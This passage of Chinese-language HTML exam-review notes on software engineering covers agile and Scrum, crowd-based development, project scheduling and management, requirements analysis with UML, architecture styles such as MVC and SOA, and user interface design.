reuse）</li><li>管理已有的构件 （management for reuse）</li><li>复用已有的构件开发新软件（development by reuse）</li></ul></li><li>特点：<ul><li>降低开发和维护成本</li><li>提升开发效率和质量</li></ul></li></ul><h4 id="%EF%BC%885%EF%BC%89%E6%95%8F%E6%8D%B7%E5%BC%80%E5%8F%91%E6%96%B9%E6%B3%95" tabindex="-1">（5）敏捷开发方法</h4><ul><li><p>定义：一种轻量级软件开发方法（相对于重量级的软件开发方法而言）</p></li><li><p>主张软件开发要以代码为中心，快速、轻巧和主动应对需求变化，持续、及时交付可运行的软件系统</p></li><li><p>敏捷开发方法的基本观点</p><ul><li>较之于过程和工具，应更加重视人和交互的价值</li><li>较之于面面俱到文档，应更加重视可运行软件系统的价值</li><li>较之于合同谈判，应更加重视客户合作的价值</li><li>较之于遵循计划，应更加重视响应用户需求变化的价值</li></ul></li><li><p>敏捷方法体现的思想</p><ul><li>强化可运行的软件，弱化文档：以可运行软件为中心来开展软件开发</li><li>以适应变化为目的来推进开发：针对变化不断进行优化和调整任务、产品和计划等</li><li>以人为本：敏捷软件开发是面向人的而不是面向过程的，让方法、技术、工具、过程等来适应人，而不是让人来适应它们</li></ul></li><li><p><strong>敏捷开发方法是一大类方法的统称，它们遵循敏捷思想</strong></p></li><li><p>支持敏捷软件开发的技术</p><ul><li>极限编程</li><li>测试驱动开发<ul><li>在开发程序代码之前，先确定和编写测试</li><li>程序员首先要思考如何对某个功能进行测试，设计好相应的测试用例，编写好相关的测试代码，然后编写相应的程序代码以通过软件测试</li></ul></li><li>Scrum方法：旨在通过增量或迭代的方式加强软件项目的管理<ul><li>首先，产品拥有者需创建软件产品订单库即“Backblog”<ul><li>描述软件产品需提供的功能需求以及它们的优先级排序</li></ul></li><li>其次，筛选出最应该实现的软件需求，<ul><li>Scrum主人基于“Backblog”中各项软件需求及其优先级，形成待实现的软件产品冲刺订单库，即“SprintLog”</li></ul></li><li>然后，软件开发将进入冲刺“Sprint”周期<ul><li>以实现选定软件订单，每个冲刺就是一次增量开发，一般持续1到4周</li></ul></li><li>最后，共同开展Scrum评审<ul><li>一次冲刺完成后，每个团队成员演示自己的开发成果，大家共同审查成果是否高质量地实现了既定功能，并就其中的问题进行反思，以指导和改进下一次冲刺</li></ul></li></ul></li></ul></li></ul><h4 id="%EF%BC%886%EF%BC%89%E7%BE%A4%E4%BD%93%E5%8C%96%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91%E6%96%B9%E6%B3%95" tabindex="-1">（6）群体化软件开发方法</h4><ul><li><p>依托互联网平台来吸引、汇聚、组织和管理互联网上的大规模软件开发人员，通过竞争、合作、协商等多种自主协同方式，让他们参与软件开发、分享软件开发知识和成果、贡献智慧和力量的一种新颖软件开发方法</p></li><li><p>群体化软件开发是一种基于社区的软件开发模式<br><img src="/images/%E6%9C%AC%E7%A7%91/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E6%9C%9F%E6%9C%AB%E7%AA%81%E5%87%BB/3_4_1.jpg" alt></p></li><li><p>群体化软件开发方法的支撑关键技术</p><ul><li>基于社区的群体化组织<ul><li>开源软件社区将核心开发人员与外围开发人员有机地结合在一起，依托软件仓库进行分布式协同开发</li></ul></li><li>基于Issue的任务管理<ul><li>开发任务的二类形式：修复软件缺陷、功能实现需求</li><li>创建Issue，提出软件开发任务</li><li>讨论Issue，分析开发任务的意义和价值</li><li>指派Issue，安排人员来完成Issue</li><li>掌控Issue，掌握Issue解决的进展状况</li></ul></li><li>基于Git的分布式版本管理</li><li>基于Pull/Request的分布式协同开发<ul><li>每个开发人员在本地完成编程工作后，不是直接向中心仓库推送代码，而是通过发送一个P/R合并请求，将原始代码库的克隆库推荐合并到中心仓库之中</li><li>接收到合并请求后，软件项目管理团队和开发人员群体需要对P/R进行审查</li></ul></li><li>基于群智的知识分享</li></ul></li></ul><h2 id="%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E8%BD%AF%E4%BB%B6%E8%AE%A1%E5%88%92%E7%AE%A1%E7%90%86" tabindex="-1">第四章 软件计划管理</h2><h3 id="1-%E8%BD%AF%E4%BB%B6%E8%AE%A1%E5%88%92" tabindex="-1">1 软件计划</h3><h4 id="%EF%BC%881%EF%BC%89%E8%BD%AF%E4%BB%B6%E8%AE%A1%E5%88%92%E6%A6%82%E8%BF%B0" tabindex="-1">（1）软件计划概述</h4><ul><li>软件计划是对软件实施所涉及的目标、任务、活动、资源、进度等进行规划</li><li>合同和策划阶段<ul><li>制定初步软件开发计划</li><li>软件项目计划分发到各个开发成员</li><li>每个成员准确了解各自任务和工作以及实施进度要求</li></ul></li><li>项目实施过程<ul><li>根据软件开发的具体计划有序实施项目</li><li>发现项目实施中存在的问题：如进度滞后</li><li>出现偏差后调整软件项目计划</li></ul></li><li>项目完成之后<ul><li>总结项目计划实施情况</li><li>分析原因，指导后续其他项目的计划制定</li></ul></li></ul><h4 id="%EF%BC%882%EF%BC%89%E8%BD%AF%E4%BB%B6%E8%BF%9B%E5%BA%A6%E5%AE%89%E6%8E%92" tabindex="-1">（2）软件进度安排</h4><ul><li><p>两种途径</p><ul><li>项目、资源 → 制定计划、交付日期</li><li>从后往前安排 ← 最后期限</li></ul></li><li><p>进度管理中要妥善处理的2个问题</p><ul><li>识别任务之间的并行、依赖关系</li><li>资源的分配和优化</li></ul></li><li><p>甘特图</p><ul><li>优点：简单，醒目，能动态地反映开发进展</li><li>缺点：不表示活动之间的依赖关系</li></ul></li><li><p>计划网络图</p><ul><li>反映任务间的顺序、并行依赖关系</li></ul></li><li><p>软件进度计划的任务</p><ul><li>确定每个活动的最早（最迟）开始时间和完成时间。</li><li>在开发方已有的资源投入下求解该软件项目的交付日期（工期），或给定工期（投资方要求）条件下来安排各活动的开始时间和结束时间。</li><li>确定关键活动、重点监管关键线路。所谓<strong>关键活动</strong>是指由于这些活动完成的耽误或更改，将直接影响项目工期目标完成。全部由关键活动组成的线路或者线路长度最长的线路称为关键线路。</li><li>根据给定的工期目标和已有项目各活动时长的条件下，对进度进行调整和优化</li></ul></li></ul><h4 id="%EF%BC%883%EF%BC%89%E8%AE%A1%E5%88%92%E7%9A%84%E4%BC%98%E5%8C%96" tabindex="-1">（3）计划的优化</h4><ul><li>工期优化<ul><li>若网络计划图的计算工期大于要求的工期时，必须根据要求计划的进度，缩短工程项目的完工工期。主要从两个方面考虑：<ul><li>优化活动间的逻辑关系，串行到并行</li><li>采取技术措施，提高开发效率，缩短关键工序的持续时间。</li><li>采取组织措施，充分利用非关键工序的机动时间，合理调配人力、物力和资金等，增加对关键工序的投入，以便缩短关键工序的持续时间</li></ul></li></ul></li><li>资源优化<ul><li>在项目工期不变的条件下，合理地利用资源。具体包括：<ul><li>优先安排关键工序所需的资源</li><li>利用非关键工序的机动时间，错开各工序的开始时间，避开在同一时区内集中使用同一资源以免出现高峰</li><li>在确实受到资源制约，或在考虑综合经济效益的条件下，在许可时也可适当推迟工期，实现错开高峰的目的。</li></ul></li></ul></li></ul><h3 id="2-%E8%BD%AF%E4%BB%B6%E7%AE%A1%E7%90%86" tabindex="-1">2 软件管理</h3><h4 id="%EF%BC%881%EF%BC%89%E8%BD%AF%E4%BB%B6%E7%AE%A1%E7%90%86%E7%9A%84%E7%89%B9%E7%82%B9" tabindex="-1">（1）软件管理的特点</h4><ul><li>目标性: 获得预期的结果</li><li>进度性: 在限定期间完成</li><li>约束性: 具有有限的资源（如人员、经费、工具等）</li><li>多方性: 涉及多个不同人与组织</li><li>独立性: 无重复性</li><li>不确定性: 项目的实施及其结果不确定性</li></ul><h4 id="%EF%BC%882%EF%BC%89%E8%BD%AF%E4%BB%B6%E7%AE%A1%E7%90%86%E5%86%85%E5%AE%B9" tabindex="-1">（2）软件管理内容</h4><p><img src="/images/%E6%9C%AC%E7%A7%91/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E6%9C%9F%E6%9C%AB%E7%AA%81%E5%87%BB/4_2_2.jpg" alt></p><ul><li><p>何为软件项目管理?</p><ul><li>对软件项目所涉及的过程、人员、产品、成本和进度等要素进行度量、分析、规划、组织和控制的过程，以确保软件项目按照预定的成本、进度、质量要求顺利完成</li><li>人员：团队建设和管理纪律和激励机制</li><li>过程：过程定义，软件度量，项目计划，项目跟踪</li><li>产品：软件产品质量管理，软件产品配置管理，软件产品需求管理</li></ul></li><li><p>过程管理</p><ul><li><ol><li>过程定义：定义、文档化软件开发过程、明确软件开发活动，得到一个良定义、全面、灵活、简洁和可供剪裁的软件开发过程</li></ol></li><li><ol start="2"><li>软件度量：对软件项目的过程、产品、资源的属性的定量描述，如软件项目的规模、成本、工作量、质量等</li></ol></li><li><ol start="3"><li>项目计划</li></ol></li><li><ol start="4"><li>项目跟踪：随时掌握软件项目的实际开发情况，提供项目实施情况的可视性，保证计划的适时调整</li></ol></li><li><ol start="5"><li>风险管理：对软件开发过程中各种风险进行识别、分析、预测、评估、监控的过程</li></ol></li></ul></li><li><p>产品管理</p><ul><li>软件质量保证：为软件产品的质量提供某种可视性，知道哪些地方有质量问题，便于改进方法和措施，提高软件产品的质量</li><li>软件配置管理：对软件基线产品进行标识、存储、更动和发放，记录和报告其状态，确保软件产品的正确性和一致性，并对上述工作的审计的过程</li><li>软件需求管理：获取、文档化和评审用户需求，对用户需求变更进行控制和管理</li></ul></li><li><p>人员管理</p><ul><li>软件项目团队：确定开发团体的结构、明确人员的角色和任务、加强人员间的交流与合作，结构合理、任务明确、团结协作、交流顺畅</li><li>纪律激励机制：制定和实施纪律约束团体，通过激励机制激发人员的激情，严格的纪律，饱满的激情</li></ul></li></ul><h4 id="%EF%BC%883%EF%BC%89%E8%BD%AF%E4%BB%B6%E7%AE%A1%E7%90%86%E7%9A%84%E6%96%B9%E6%B3%95" tabindex="-1">（3）软件管理的方法</h4><ul><li>人员组织方式<ul><li>民主制程序员组</li><li>主程序员组</li><li>现代程序员组：实际的“主程序员”应该由两个人共同担任：  一个技术负责人，负责小组的技术活动；一个行政负责人，负责所有非技术性事务的管理决策。</li></ul></li></ul><h2 id="%E7%AC%AC%E4%BA%94%E7%AB%A0-%E9%9C%80%E6%B1%82%E5%88%86%E6%9E%90" tabindex="-1">第五章 需求分析</h2><h3 id="1-%E9%9C%80%E6%B1%82%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80" tabindex="-1">1 需求分析基础</h3><ul><li>需求的概念：分类、特点、质量要求、重要性</li><li>需求工程<ul><li>需求工程的一般过程</li><li>需求工程的常用方法<ul><li>结构化需求分析方法</li><li>面向对象需求分析方法</li></ul></li></ul></li><li>需求工程的输出、评审和管理</li></ul><h4 id="%EF%BC%881%EF%BC%89%E9%9C%80%E6%B1%82%E7%9A%84%E6%A6%82%E5%BF%B5" tabindex="-1">（1）需求的概念</h4><ul><li><p>软件开发的本质<br><img src="/images/%E6%9C%AC%E7%A7%91/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E6%9C%9F%E6%9C%AB%E7%AA%81%E5%87%BB/5_1_1.jpg" alt></p></li><li><p>何为利益相关方(stakeholder)</p><ul><li>从软件系统中受益或与软件系统相关的人、组织或者系统</li><li>受益：使用、获益、盈利</li><li>相关：发生操作和交互、存在关联性</li></ul></li><li><p>软件利益相关方的表现形式</p><ul><li>用户：最终使用软件的人</li><li>客户：从中获取利益的组织</li><li>系统：与待开发系统进行交互的系统</li><li>开发者：负责开发软件系统的人</li><li>示例：空巢老人看护软件利益相关方<ul><li>用户：老人，家属，医生</li><li>客户：投资方</li><li>系统：机器人</li></ul></li></ul></li><li><p>何为软件需求(Software Requirement)?</p><ul><li>从软件本身的角度，软件需求是指软件用于解决现实世界问题时所表现出的功能和性能等方面的要求</li><li>从软件利益相关方的角度，软件需求是指软件系统的利益相关方对软件系统的功能和质量，以及软件运行环境、交付进度等方面提出的期望和要求</li></ul></li><li><p>软件需求的类别</p><ul><li>软件功能性需求(Functional)<ul><li>能够完成的功能及在某些场景下可展现的外部可见行为或效果</li></ul></li><li>软件质量方面的需求(Quality)<ul><li>外部质量属性，外部可展现的，用户、客户等会非常关心，如运行性能、可靠性、易用性等</li><li>内部质量属性，隐藏在内部的，软件开发工程师会非常关心，如可扩展性、可维护性、可理解性</li></ul></li><li>软件开发约束性需求(Constraint)<ul><li>开发成本、交付进度、技术选型、遵循标准等方面提出的要求</li></ul></li><li>软件需求示例：空巢老人看护软件<ul><li>功能性需求：自主跟随老人、获取老人图像和视频信息、检测老人是否摔倒等</li><li>质量方面的需求：始终保持在2米的安全距离，对机器人的控制在2秒内响应等</li><li>约束性需求：成本不能超出50万元，要求半年内交付使用等等</li></ul></li></ul></li><li><p>软件需求的重要性</p><ul><li>软件的价值所在</li><li>软件开发的基础和前提</li><li>软件验收的标准和依据</li></ul></li></ul><h4 id="%EF%BC%882%EF%BC%89%E9%9C%80%E6%B1%82%E5%B7%A5%E7%A8%8B" tabindex="-1">（2）需求工程</h4><ul><li><p>旨在用工程的理念和方法来指导软件需求实践，它提供了一系列的过程、策略、方法学和工具，帮助需求工程师加强对业务或领域问题及其环境的理解、获取和分析软件需求，指导软件需求的文档化和评审，以尽可能获得准确、一致和完整的软件需求，产生软件需求的相关软件制品<br><img src="/images/%E6%9C%AC%E7%A7%91/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E6%9C%9F%E6%9C%AB%E7%AA%81%E5%87%BB/5_1_2.jpg" alt></p></li><li><p>需求工程的方法学</p><ul><li>抽象<ul><li>20世纪70年代结构化数据和数据流抽象</li><li>20世纪90年代面向对象抽象</li></ul></li><li>建模<ul><li>采用自然语言或结构化自然语言</li><li>图形化的需求建模语言</li></ul></li><li>分析<ul><li>循序渐进地获得软件需求细节，进而逐步得到详细的软件需求</li></ul></li></ul></li><li><p>需求工程方法（详见复习重点）</p><ul><li>结构化需求分析方法</li><li>面向对象需求分析方法</li></ul></li><li><p>需求工程的输出</p><ul><li>软件需求模型</li><li>软件需求文档</li><li>软件原型</li><li>修正的软件开发计划</li><li>验收测试计划</li></ul></li></ul><h3 id="2-%E9%9C%80%E6%B1%82%E8%8E%B7%E5%8F%96" tabindex="-1">2 需求获取</h3><ul><li><p>获取软件需求是指得到或产生软件需求</p></li><li><p>明确问题和基于软件的解决方案</p></li><li><p>导出和构思初步软件需求</p></li><li><p>描述初步软件需求</p><ul><li>自然语言描述</li><li>软件原型模式</li><li><strong>用例图描述</strong>（详见复习重点）</li></ul></li><li><p>用例的进一步详细描述</p><ul><li>用例名：用户登录</li><li>用例标识： UC-UserLogin</li><li>主要执行者：家属、医生</li><li>目标：通过合法身份登录系统以获得操作权限</li><li>范围：空巢老人看护软件</li><li>前置条件：使用App软件之时</li><li>交互动作：<ul><li>用户输入账号和密码</li><li>系统验证用户账号和密码的正确性和合法性</li><li>验证正确和合法则意味着登录成功</li></ul></li></ul></li></ul><h3 id="3-%E5%88%86%E6%9E%90%E8%BD%AF%E4%BB%B6%E9%9C%80%E6%B1%82" tabindex="-1">3 分析软件需求</h3><h4 id="%EF%BC%881%EF%BC%89%E5%88%86%E6%9E%90%E8%BD%AF%E4%BB%B6%E9%9C%80%E6%B1%82%E6%A6%82%E8%BF%B0" tabindex="-1">（1）分析软件需求概述</h4><ul><li><p>基于初步软件需求，进一步精化和分析软件需求，确定软件需求优先级，建立软件需求模型，发现和解决软件需求缺陷，形成高质量的软件需求模型和软件需求规格说明书</p></li><li><p>用例视角</p><ul><li>具有哪些功能、功能间有何关系、功能与利益相关方有何关系</li><li>UML提供了用例图来分析和描述用例视角的软件需求模型</li></ul></li><li><p>行为视角</p><ul><li>用例是如何通过业务领域中一组对象以及它们间的交互来达成的</li><li>UML提供了交互图、状态图来描述行为视角的软件需求模型</li></ul></li><li><p>结构视角</p><ul><li>业务领域有哪些重要的领域概念以及它们之间具有什么样的关系</li><li>UML提供了类图来描述和分析业务领域的概念模型</li></ul></li><li><p><strong>UML交互图</strong> 详见重点</p></li><li><p><strong>类图</strong> 详见重点</p></li><li><p><strong>对象图</strong></p><ul><li>类图在系统的运行过程中某个时刻点上或某一时间段内的实例化样本<ul><li>类图中的一个类在对象图中可表现为多个活跃的对象实例</li><li>对象图的链接边是类图中关联边的实例化</li><li>类图中的其他边，如继承、依赖等在对象图中则无从表现</li></ul></li><li>示例：<img src="/images/%E6%9C%AC%E7%A7%91/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E6%9C%9F%E6%9C%AB%E7%AA%81%E5%87%BB/%E5%AF%B9%E8%B1%A1%E5%9B%BE%E7%A4%BA%E4%BE%8B.jpg" alt></li><li>不常用</li></ul></li><li><p><strong>状态图</strong></p><ul><li>功效<ul><li>描述实体（对象、系统）在事件刺激下的反应式动态行为及其导致的状态变化</li><li>刻画了实体的可能状态、每个状态下可响应事件、响应动作、状态迁移</li></ul></li><li>图的构成<ul><li>节点：状态</li><li>边：迁移，即状态间因事件刺激而触发的状态变化</li></ul></li></ul></li></ul><h4 id="%EF%BC%882%EF%BC%89%E5%88%86%E6%9E%90%E8%BD%AF%E4%BB%B6%E9%9C%80%E6%B1%82%E8%BF%87%E7%A8%8B" tabindex="-1">（2）分析软件需求过程</h4><ol><li>分析和确定软件需求优先级<ul><li>分析软件需求重要性</li><li>分析软件需求优先级</li><li>确定用例分析和实现的次序</li></ul></li><li>分析和确定软件需求模型<br><img src="/images/%E6%9C%AC%E7%A7%91/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E6%9C%9F%E6%9C%AB%E7%AA%81%E5%87%BB/%E5%BB%BA%E7%AB%8B%E8%BD%AF%E4%BB%B6%E9%9C%80%E6%B1%82%E6%A8%A1%E5%9E%8B%E5%85%B7%E4%BD%93%E6%AD%A5%E9%AA%A4.jpg" alt><br><strong>分析和建立用例的交互模型</strong>见重点<ul><li>分析和建立分析类模型<ul><li>确定分析类</li><li>确定分析类的职责</li><li>确定分析类的属性</li><li>确定分析类之间的关系</li><li>绘制分析类图</li></ul></li><li>分析和建立软件需求的状态模型<ul><li>用UML的状态图来描述这些对象的状态模型，以刻画对象拥有哪些状态、对象的状态如何受事件的影响而发生变化</li></ul></li></ul></li></ol><h4 id="%EF%BC%883%EF%BC%89%E8%BD%AF%E4%BB%B6%E9%9C%80%E6%B1%82%E6%96%87%E6%A1%A3%E5%8F%8A%E8%AF%84%E5%AE%A1" tabindex="-1">（3）软件需求文档及评审</h4><h2 id="%E7%AC%AC%E5%85%AD%E7%AB%A0-%E8%BD%AF%E4%BB%B6%E8%AE%BE%E8%AE%A1" tabindex="-1">第六章 软件设计</h2><h3 id="1-%E8%BD%AF%E4%BB%B6%E8%AE%BE%E8%AE%A1%E6%A6%82%E8%BF%B0" tabindex="-1">1 软件设计概述</h3><h4 id="%EF%BC%881%EF%BC%89%E8%BD%AF%E4%BB%B6%E8%AE%BE%E8%AE%A1%E5%9F%BA%E7%A1%80" tabindex="-1">（1）软件设计基础</h4><ul><li><p>软件设计：针对软件需求，综合考虑各种制约因素，探究软件实现的解决方案</p></li><li><p>设计前提：软件需求</p><ul><li>定义了要做什么样的软件</li></ul></li><li><p>设计考虑：制约因素</p><ul><li>资源：时间、人力、财力、开发辅助工具</li><li>技术：技术平台，如DBMS还是文件系统<br><img src="/images/%E6%9C%AC%E7%A7%91/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E6%9C%9F%E6%9C%AB%E7%AA%81%E5%87%BB/%E8%BD%AF%E4%BB%B6%E8%AE%BE%E8%AE%A1%E8%BF%87%E7%A8%8B.jpg" alt></li></ul></li><li><p>软件设计过程</p><ul><li>软件结构设计<ul><li>从全局和宏观视角、站在最高抽象层次来设计软件系统</li></ul></li><li>用户界面设计<ul><li>设计软件对外展示以及与用户进行交互的界面，关注软件如何与用户进行交互</li></ul></li><li>软件详细设计<ul><li>对体系结构设计和人机交互设计成果进行细化和精化，获得高质量的、充分细化的软件设计模型</li><li>数据设计；接口设计；类设计；算法设计；</li></ul></li></ul></li><li><p>软件设计元素</p><ul><li>设计类：类既是最基本的设计单元，也是最基本的模块单元<br>软构件</li><li>软构件<ul><li>可分离、可单独重用、可独立部署和执行的一类设计元素</li><li>如动态链接库（.DLL）、可运行的Java JAR包、微服务镜像等就属于软构件</li></ul></li><li>子系统<ul><li>完成特定功能、逻辑上相互关联的一组模块集合</li><li>有助于管理软件系统的复杂度，简化软件设计和实现</li></ul></li></ul></li><li><p>软件设计基本原则</p><ul><li>抽象原则</li><li>模块化、高内聚度和低耦合度原则</li><li>信息隐藏原则</li><li>关注点分离原则</li><li>软件重用原则</li></ul></li></ul><h4 id="%EF%BC%882%EF%BC%89%E8%BD%AF%E4%BB%B6%E8%AE%BE%E8%AE%A1%E6%96%B9%E6%B3%95" tabindex="-1">（2）软件设计方法</h4><ul><li>结构化方法<ul><li><ol><li>复审并精化数据流图</li></ol></li><li><ol start="2"><li>确定输入流和输出流的边界</li></ol></li><li><ol start="3"><li>第一级分解方法</li></ol></li><li><ol start="4"><li>第二级分解方法</li></ol></li><li><ol start="5"><li>软件结构求精</li></ol></li></ul></li><li>面向对象方法<ul><li><img src="/images/%E6%9C%AC%E7%A7%91/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E6%9C%9F%E6%9C%AB%E7%AA%81%E5%87%BB/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E8%BD%AF%E4%BB%B6%E8%AE%BE%E8%AE%A1%E8%BF%87%E7%A8%8B.jpg" alt></li><li>用包图表示的软件系统的结构设计</li><li>用交互图来表示用户界面设计</li></ul></li></ul><h3 id="2-%E8%BD%AF%E4%BB%B6%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84%E8%AE%BE%E8%AE%A1" tabindex="-1">2 软件体系结构设计</h3><h4 id="%EF%BC%881%EF%BC%89%E8%BD%AF%E4%BB%B6%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84%E5%9F%BA%E7%A1%80" tabindex="-1">（1）软件体系结构基础</h4><ul><li><p>软件体系结构设计元素</p><ul><li>构件/组件(Component)：构成体系结构的基本功能部件<ul><li>软件系统中的物理模块，具有特定的功能和精确定义的对外接口，外界可通过接口来访问它</li><li>例：.dll,.jar文件</li></ul></li><li>连接件：组件之间的连接和交互关系<ul><li>每个软构件并非孤立，它们之间通过连接进行交互</li><li>交互的目的是为了交换数据、获得服务</li><li>例：接口，端口</li></ul></li><li>约束</li></ul></li><li><p>软件体系结构设计视图</p><ul><li>逻辑视图</li><li>开发视图</li><li>部署视图</li><li>运行视图</li></ul></li><li><p>软件体系结构建模</p><ul><li>包图</li><li>构件图</li><li>部署图<br>软件体系结构风格<br>分层风格、管道过滤器风格、黑板风格、MVC风格、SOA风格、消息总线风格</li></ul></li><li><p>软件设计模式：以设计重用为目的，采用一种良定义的、正规的、一致的方式记录的软件设计经验</p></li><li><p>常用软件体系结构风格</p><ul><li>分层风格<ul><li>层次间的关系<ul><li>每层为其紧邻上层提供服务，使用紧邻下层所提供的服务</li><li>上层向下层发出服务请求，下层为上层反馈服务结果</li><li>下层向上层提供事件信息，上层对下层通知做出处理</li></ul></li><li>特点：松耦合，可替换，可复用，标准化</li></ul></li><li>管道与过滤器风格<ul><li>构件<ul><li>将软件功能实现为一系列处理步骤，每个步骤封装在一个过滤器构件中</li></ul></li><li>连接子<ul><li>相邻过滤器间以管道连接，一个过滤器的输出数据借助管道流向后续过滤器，作为其输入数据</li></ul></li><li>编译器采用的就是一个典型的管道/过滤器风格</li></ul></li><li>黑板风格：将软件系统划分为黑板、知识源和控制器三类构件<ul><li>黑板：负责保存问题求解过程中的状态数据，并提供这些数据的读写服务</li><li>知识源：负责根据黑板中存储的问题求解状态评价其自身的可应用性，进行部分问题求解工作，并将此工作的结果数据写入黑板</li><li>控制器：负责监视黑板中不断更新的状态数据，安排（多个）知识源的活动</li></ul></li><li>MVC风格<ul><li>模型构件：负责存储业务数据并提供业务逻辑处理功能</li><li>视图构件：负责向用户呈现模型中的数据</li><li>控制器：在接获模型的业务逻辑处理结果后，负责选择适当的视图作为软件系统对用户的界面动作的响应</li><li>步骤：<ul><li>创建视图，视图对象从模型中获取数据并呈现用户界面</li><li>控制器将用户界面事件转换为业务逻辑处理功能的调用</li><li>模型进行业务逻辑处理，将处理结果回送给控制器，必要时还需将业务数据变化事件通知给所有视图</li></ul></li></ul></li><li>SOA风格<ul><li>将软件系统的软构件抽象为一个个的服务（Service），每个服务封装了特定的功能并提供了对外可访问的接口</li><li>任何一个服务既可以充当服务的提供方，接受其他服务的访问请求；也可充当服务的请求方，请求其他服务为其提供功能</li><li>任何服务需要向服务注册中心进行注册登记，描述其可提供的服务以及访问方式，才可对外提供服务</li></ul></li><li>总线风格：包含了一组软构件和一条称为“消息总线”的连接件来连接各个软构件</li></ul></li></ul><h4 id="%EF%BC%882%EF%BC%89%E8%BD%AF%E4%BB%B6%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84%E8%AE%BE%E8%AE%A1%E8%BF%87%E7%A8%8B" tabindex="-1">（2）软件体系结构设计过程</h4><ul><li><p>软件体系结构设计的原则</p><ul><li>高层抽象和组织</li><li>模块化</li><li>信息隐藏</li><li>软件重用</li><li>多视点分离<br><img src="/images/%E6%9C%AC%E7%A7%91/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E6%9C%9F%E6%9C%AB%E7%AA%81%E5%87%BB/%E8%BD%AF%E4%BB%B6%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84%E8%AE%BE%E8%AE%A1%E8%BF%87%E7%A8%8B.jpg" alt></li></ul></li><li><p>设计初步的软件体系结构</p><ul><li>任务：基于功能性和非功能性软件需求，参考业界已有的软件体系结构设计风格，设计出目标软件系统的初始体系结构，明确每个构件的职责以及构件间的通信和协作关系</li><li>输出：初步的软件体系结构<br><img src="/images/%E6%9C%AC%E7%A7%91/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E6%9C%9F%E6%9C%AB%E7%AA%81%E5%87%BB/%E4%B8%8D%E5%90%8C%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84%E9%A3%8E%E6%A0%BC%E9%80%82%E5%90%88%E7%9A%84%E5%BA%94%E7%94%A8.jpg" alt></li></ul></li><li><p>重用开源软件及已有软件资产</p><ul><li>可直接使用的软件资产<ul><li>清晰地定义它们与当前软件系统间的交互接口</li><li>包括数据交换的格式、互操作协议等</li></ul></li><li>不可直接使用但具复用潜力的设计资产<ul><li>采用接口重构、适配器等方法将其引入到当前体系结构中</li><li>接口重构是指，调整当前体系结构中面向可复用设计资产的调用接口，使之与其提供的服务接口相匹配</li></ul></li></ul></li><li><p>精化软件体系结构</p><ul><li>选择软件体系结构所依赖的公共基础设施：如操作系统、软件中间件、数据库管理系统、软件开发框架、安全服务等</li><li>确定软件体系结构中的设计元素：包括子系统、软构件和关键设计类等，明确其职责和接口，从而为开展详细设计奠定基础</li></ul></li><li><p>设计部署模型：刻画软件系统的各个子系统、软构件如何部署到计算节点上运行的，描述它们的部署和运行环境</p></li></ul><h3 id="3-%E7%94%A8%E6%88%B7%E7%95%8C%E9%9D%A2%E8%AE%BE%E8%AE%A1" tabindex="-1">3 用户界面设计</h3><h4 id="%EF%BC%881%EF%BC%89%E7%94%A8%E6%88%B7%E7%95%8C%E9%9D%A2%E5%9F%BA%E7%A1%80" tabindex="-1">（1）用户界面基础</h4><ul><li><p>人机交互的关键</p><ul><li>用户的满意度</li><li>方便输入</li><li>直观输出</li></ul></li><li><p>用户界面元素及实现方式</p><ul><li>静态元素</li><li>动态元素</li><li>用户输入元素</li><li>用户命令元素</li></ul></li><li><p>用UML类图表示用户界面元素</p><ul><li>窗口或对话框 -&gt; 对象类</li><li>静态和动态元素 -&gt; 类属性</li><li>输入元素 -&gt; 类属性</li><li>命令元素 -&gt; 类方法</li></ul></li></ul><h4 id="%EF%BC%882%EF%BC%89%E7%94%A8%E6%88%B7%E7%95%8C%E9%9D%A2%E8%AE%BE%E8%AE%A1%E8%BF%87%E7%A8%8B" tabindex="-1">（2）用户界面设计过程</h4><ul><li><p>用户界面设计的任务</p><ul><li>根据软件需求及其操作流程，为其设计出与用户进行交互的界面，支持用户对软件的操作和使用</li></ul></li><li><p>用户界面设计的原则</p><ul><li>直观性</li><li>易操作性</li><li>反应性</li><li>一致性</li><li>容错性</li><li>人性化</li></ul></li><li><p>用户界面设计的过程<img src="/images/%E6%9C%AC%E7%A7%91/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E6%9C%9F%E6%9C%AB%E7%AA%81%E5%87%BB/%E7%94%A8%E6%88%B7%E7%95%8C%E9%9D%A2%E8%AE%BE%E8%AE%A1%E8%BF%87%E7%A8%8B.jpg" alt></p></li><li><p>用户界面初步设计</p><ul><li>根据需求确定用户界面</li><li>确定用户界面的设计元素（属性和操作）</li></ul></li><li><p>建立用户界面间的跳转关系</p><ul><li>用UML图来表示用户界面的跳转关系<ul><li>交互图：表示特定场景下的跳转及跳转发生时的消息传递</li><li>类图：表示界面间所有可能发生的跳转及跳转的原因</li></ul></li></ul></li></ul><h3 id="4-%E8%BD%AF%E4%BB%B6%E8%AF%A6%E7%BB%86%E8%AE%BE%E8%AE%A1" tabindex="-1">4 软件详细设计</h3><h4 id="%EF%BC%881%EF%BC%89%E8%BD%AF%E4%BB%B6%E8%AF%A6%E7%BB%86%E8%AE%BE%E8%AE%A1%E5%9F%BA%E7%A1%80" 